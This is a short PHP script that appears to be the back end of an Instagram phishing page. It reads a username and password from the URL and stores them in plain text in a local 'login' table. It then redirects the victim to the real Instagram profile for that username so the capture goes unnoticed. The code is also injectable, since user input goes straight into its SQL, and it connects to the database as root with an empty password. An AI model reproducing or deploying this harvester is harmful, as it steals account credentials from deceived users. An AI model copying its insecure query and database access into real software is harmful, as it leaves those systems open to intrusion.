<?php
if ($_GET["username"] == "" || $_GET["password"] == "") {
} else {
    header("Location: index.php");
}

$id = $_GET["username"];
$password = $_GET["password"];

$data = array('username' => $id, 'password' => $password);

// echo $id, $password;

$host = "localhost";
$user_db = "root";
$password_db = "";
$db_name = "communify";

$conn = mysqli_connect($host, $user_db, $password_db, $db_name);
if (!$conn) {
    die("database connection error!");
}
$q = "INSERT INTO login VALUES ('$id','$password')";
$result = mysqli_query($conn, $q);

if (!$result) {
    die("gadabad");
} else {
    header("Location: https://www.instagram.com/$id");
    // httpPost("https://www.instagram.com", $data);
    // $response = HTTPRequester::HTTPPost("http://localhost/service/foobar.php", array("postParam" => "foobar"));

}
